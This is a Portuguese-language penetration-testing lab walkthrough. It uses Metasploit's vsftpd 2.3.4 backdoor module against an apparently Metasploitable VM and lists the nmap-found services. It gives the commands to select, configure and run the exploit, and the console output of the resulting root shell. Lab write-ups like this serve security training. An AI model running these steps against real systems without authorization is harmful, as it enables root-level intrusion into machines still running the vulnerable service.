# 02. Pós-exploração com METASPLOIT

Após realizar a etapa de exploração de serviços com o <i><b>NMAP</i></b> (leia <a href="01_exploracao_com_nmap.md">01. Exploração com <b>NMAP</b></a> para entender o fluxo de pensamento daqui), iremos tentar conseguir o acesso ao <i><b>shell/terminal</i></b> da nossa máquina de alguma forma.

Analisando o retorno que o <i><b>NMAP</i></b> nos trouxe, vemos que temos diversos serviços rodando na nossa máquina alvo. Fazendo uma listagem dos quais conseguimos reconhecer os serviços executados, temos:

- `FTP`, com o `vsftp`, na versão `2.3.4`, na porta `21`.
- `SSH`, com o `OpenSSH`, na versão `4.7p1`, na porta `22`.
- `TELNET`, com o `telnet (linux)`, na porta `23`.
- `SAMBA`, com o `smtpd`, na porta `25`.
- `DOMAIN`, com o `ISC BIND`, na versão `9.4.2`, na porta `53`.
- `HTTP`, com o `Apache httpd`, na versão `2.2.8`, na porta `80`.
- `RPCBIND`, na porta `111`.
- `SAMBA`, com o `Samba smbd`, no range de versão `3.x - 4.x`, na porta `139`.
- `SAMBA`, com o `Samba smbd`, no range de versão `3.x - 4.x`, na porta `445`.
- `SHELL`, com o `Netkit rshd`, na porta `514`.
- `JAVA-RMI`, com o `GNU Classpath grmiregistry`, na porta `1099`.
- `BINDSHELL`, com o `Metasploitable root shell`, na porta `1524`.
- `NFS`, no range de versão `2-4`, na porta `2049`.
- `FTP`, com o `ProFTPD`, na versão `1.3.1`, na porta `2121`.
- `MYSQL`, com o `MySQL`, na versão `5.0.51a-3ubuntu5`, na porta `3306`.
- `DISTCCD`, com o `distccd`, na versão `v1`, na porta `3632`.
- `POSTGRESQL`, com o `PostgreSQL DB`, no range de versão `8.3.0 - 8.3.7`, na porta `5432`.
- `X11`, na porta `6000`.
- `IRC`, com o `UnrealIRCd`, na porta `6667`.
- `IRC`, com o `UnrealIRCd`, na porta `6697`.
- `AJP13`, com o `Apache Jserv`, com o protocolo na versão `v1.3`, na porta `8009`.
- `HTTP`, com o `Apache Tomcat/Coyote JSP engine`, na versão `1.1`, na porta `8180`.
- `DRB`, com o `Ruby DRb RMI`, na porta `8787`.
- `NLOCKMGR`, na porta `38718`.
- `JAVA-RMI`, com o `GNU Classpath grmiregistry`, na porta `38811`.
- `MOUNTD`, na porta `38909`.
- `STATUS`, na porta `55674`.

Rapaz, quanto serviço rodando junto em uma máquina. <b>Mas isso não será impeditivo para <i>MIM</i>.</b>

Para darmos o nosso primeiro passo, vamos usar uma ferramenta chamada <i><b>Metasploit</b></i>.

O <i><b>Metasploit</b></i> é uma ferramenta <i><b>open-source</b></i> de uso em <i><b>terminal/console</b></i> com a finalidade de realizar testes de <i><b>penetração/intrusão</b></i> e <i><b>exploração de vulnerabilidades</b></i> de serviços que estejam em execução em uma máquina. É uma ferramenta extremamente fácil e rápida de utilizar, simplificando bastante até o desenvolvimento, teste e a execução de <i><b>exploits</b></i>. Contém agregado a ele uma gama <i><b>IMENSA</b></i> de vulnerabilidades já conhecidas e exploradas pela comunidade de <i><b>cybersegurança</b></i>.

Enfim - explicação feita, vamos começar!

Abrindo o <i><b>CLI</b></i> do <i><b>Metasploit</b></i> com o comando:

`$ msfconsole`

E logo após executar o boot do programa, resolvo procurar pelo primeiro serviço da lista que o <i><b>NMAP</b></i> me entregou:

`msf > search vsftpd`

E então, <b>BINGO</b>! Nos é retornado uma pequena lista que tem um <i><b>exploit</b></i> no qual poderemos utilizar na nossa máquina alvo:

```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
```

Mavailha - agora vamos selecionar o <i><b>exploit</b></i> de número <i><b>1</b></i> com o comando abaixo:

`msf > use 1`

Selecionado o <i><b>exploit</b></i> que iremos usar, temos de configurar-lo para ele realizar os testes e comprometer o serviço alvo desejado. Vamos ver quais são as opções a configurar:

```
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h, sapni, http, socks4, socks5
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

Os valores obrigatórios que o <i><b>exploit</b></i> cobra são: `RHOSTS` e `RPORT`. O valor `RPORT` já está configurado corretamente, então vamos configurar o valor de `RHOSTS`:

`msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102`

Maravilha. Com tudo pronto, agora é só executar o <i><b>exploit</b></i> e se preparar para o retorno dele:

```
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.102:21 - USER: 331 Please specify the password.
[+] 192.168.56.102:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.102:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.1:35945 -> 192.168.56.102:6200) at 2025-10-18 15:49:15 -0300

whoami
root
```

<b>PERFEITO DEMAIS!</b> O <i><b>exploit</b></i> funcionou e já direto com acesso ao usuário <i><b>root</b></i> (superusuário, o usuário de nível mais alto no sistema do linux).

Agora o céu é o limite. E vamos com tudo para nossa próxima etapa!